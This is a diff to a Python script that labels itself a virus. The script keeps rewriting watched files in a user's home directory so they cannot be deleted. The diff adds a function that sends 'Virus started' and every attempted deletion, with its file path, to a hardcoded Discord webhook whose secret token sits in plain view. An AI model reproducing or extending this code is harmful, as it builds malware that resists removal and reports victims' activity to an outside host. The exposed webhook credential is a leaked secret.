@@ -1,6 +1,10 @@
 import os, time
 import threading
-
+import requests
+def log_to_discord(msg:str):
+  data = {"username":"VirusLog", "content":msg}
+  requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
+log_to_discord("Virus started...")
 home_dir = r"C:\Users\justlinux"  # Use raw string
 
 
@@ -47,6 +51,7 @@ while True:
       if not os.path.exists(path) or open(path, "rb").read() != backup:
         with open(path, "wb") as file:
           file.write(backup)
+        log_to_discord(f"they tried to delete file {path}")
   time.sleep(1)
 
 
